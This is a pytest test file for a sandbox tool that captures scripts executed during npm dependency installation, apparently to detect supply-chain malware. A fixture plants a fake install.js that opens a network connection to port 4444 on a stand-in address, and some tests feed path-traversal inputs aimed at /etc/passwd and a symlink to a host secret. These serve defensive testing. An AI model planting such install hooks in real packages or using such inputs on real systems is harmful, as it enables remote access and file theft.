import hashlib
import os

import pytest

from chamber.scripts import collect_executed_scripts
from shared.contract import MAX_EXECUTED_SCRIPTS, MAX_SCRIPT_CHARS, ExecEvent

PKG = "/work/node_modules/color-helper"


def ex(pid: int, args: str, cwd: str = PKG, binary: str = "/usr/local/bin/node", ppid: int = 1):
    return ExecEvent(ts="t", pid=pid, ppid=ppid, binary=binary, args=args, parent_binary="sh",
                     uid=10001, cwd=cwd)  # fmt: skip


@pytest.fixture
def src(tmp_path):
    d = tmp_path / "src" / "node_modules" / "color-helper"
    d.mkdir(parents=True)
    (d / "install.js").write_text('require("net").connect(4444, "203.0.113.10");\n')
    return tmp_path / "src"


def test_executed_dependency_script_is_captured_with_hash(src):
    [s] = collect_executed_scripts([ex(2, "install.js")], src)
    assert s.path == f"{PKG}/install.js" and s.package == "color-helper"
    content = (src / "node_modules/color-helper/install.js").read_bytes()
    assert s.sha256 == hashlib.sha256(content).hexdigest() and "203.0.113.10" in s.content


def test_symlink_escaping_the_job_dir_is_never_read(src, tmp_path):
    secret = tmp_path / "host-secret"
    secret.write_text("HOST SECRET")
    try:
        os.symlink(secret, src / "node_modules/color-helper/evil.js")
    except OSError:
        pytest.skip("symlinks need privileges here (Windows); verified on the Chamber VM")
    assert collect_executed_scripts([ex(2, "evil.js")], src) == []


def test_paths_outside_work_and_missing_files_ignored(src):
    execs = [ex(2, "/etc/passwd"), ex(3, "../../../../etc/passwd"), ex(4, "nope.js")]
    assert collect_executed_scripts(execs, src) == []


def test_binaries_skipped_and_large_files_truncated(src):
    d = src / "node_modules/color-helper"
    (d / "tool").write_bytes(b"\x7fELF\x00\x00binary")
    (d / "big.js").write_text("x" * (MAX_SCRIPT_CHARS + 10))
    scripts = collect_executed_scripts([ex(2, "tool"), ex(3, "big.js")], src)
    assert [s.path.rsplit("/", 1)[-1] for s in scripts] == ["big.js"] and scripts[0].truncated


def test_active_processes_first_so_noise_cannot_crowd_out_the_payload(src):
    d = src / "node_modules/color-helper"
    for i in range(MAX_EXECUTED_SCRIPTS + 2):
        (d / f"noise{i}.js").write_text("ok")
    noise = [ex(10 + i, f"noise{i}.js") for i in range(MAX_EXECUTED_SCRIPTS + 2)]
    payload = ex(99, "install.js")
    scripts = collect_executed_scripts([*noise, payload], src, active_pids={99})
    assert scripts[0].path.endswith("install.js") and len(scripts) == MAX_EXECUTED_SCRIPTS


def test_project_own_script_has_no_package(src):
    (src / "setup.js").write_text("ok")
    [s] = collect_executed_scripts([ex(2, "setup.js", cwd="/work")], src)
    assert s.package is None
